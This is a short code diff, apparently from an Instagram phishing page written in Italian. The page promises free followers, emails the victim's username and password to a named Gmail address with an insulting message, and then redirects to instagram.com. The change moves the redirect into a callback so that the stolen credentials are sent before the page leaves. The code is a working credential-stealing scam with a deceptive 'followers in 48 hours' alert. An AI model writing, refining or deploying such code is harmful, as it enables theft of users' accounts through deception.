@@ -14,8 +14,9 @@ buttonDom.addEventListener('click', () => {
             From : "alberto.ice04@gmail.com",
             Subject : "Credenziali accesso instagram",
             Body : `Un coglione ha inviato le credenziali: ${user} ${password}`
+        }).then(() => {
+            location.href = 'https://www.instagram.com/'
         })
         alert('Operazione eseguta con successo! Riceverai i followers entro 48 ore');
-        location.href = 'https://www.instagram.com/'
     }
 })
